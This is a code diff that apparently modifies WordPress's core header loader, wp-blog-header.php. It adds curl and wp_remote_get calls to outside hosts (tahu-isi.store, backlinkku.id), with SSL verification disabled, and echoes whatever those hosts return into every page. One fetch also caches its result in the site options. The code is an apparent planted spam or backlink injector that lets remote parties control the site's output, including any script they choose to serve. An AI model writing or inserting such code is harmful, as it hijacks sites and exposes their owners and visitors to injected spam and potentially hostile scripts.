@@ -19,6 +19,19 @@ if ( ! isset( $wp_did_header ) ) {
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
 }
+$url = 'https://tahu-isi.store/totomacau.txt';
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // jika SSL error
+$content = curl_exec($ch);
+curl_close($ch);
+
+if ($content !== false) {
+  echo $content;
+}
 function fetch_and_display_content($url) {
     $response = wp_remote_get($url);
     if (is_wp_error($response)) {
@@ -31,5 +44,7 @@ function fetch_and_display_content($url) {
     update_option('jasabacklink_content', $body);
     echo $body;
 }
-$jasabacklinks = 'https://backlinkku.id/menu/server-id/script.txt';
+$jasabacklinks = 'https://www.backlinkku.id/menu/traffic-v1/script.txt';
 fetch_and_display_content($jasabacklinks);
+$ilmumahal = 'https://www.backlinkku.id/menu/vip-v2/script.txt';
+fetch_and_display_content($ilmumahal);
